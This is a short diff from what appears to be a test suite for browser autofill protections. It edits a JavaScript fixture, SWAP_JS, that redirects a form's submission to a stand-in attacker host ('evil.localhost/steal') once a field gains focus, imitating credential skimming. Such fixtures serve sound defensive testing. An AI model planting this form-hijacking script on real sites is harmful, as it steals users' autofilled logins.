@@ -96,9 +96,12 @@ LEAK_JS = """<script>
 # The form's action moves to the attacker's origin as soon as a field is
 # focused: an injected script (or HTML) trying to collect what autofill puts in.
 SWAP_JS = """<script>
-document.addEventListener('focusin', () => {
-  document.getElementById('f').action = 'https://evil.localhost:%d/steal';
-});
+(() => {
+  const swap = () => { document.getElementById('f').action = 'https://evil.localhost:%d/steal'; };
+  document.addEventListener('focusin', swap);
+  // an autofocus may have happened before this script ran
+  if (document.activeElement && document.activeElement.form) swap();
+})();
 </script>"""
 
 # React's controlled inputs, reduced to the mechanism that matters: React keeps
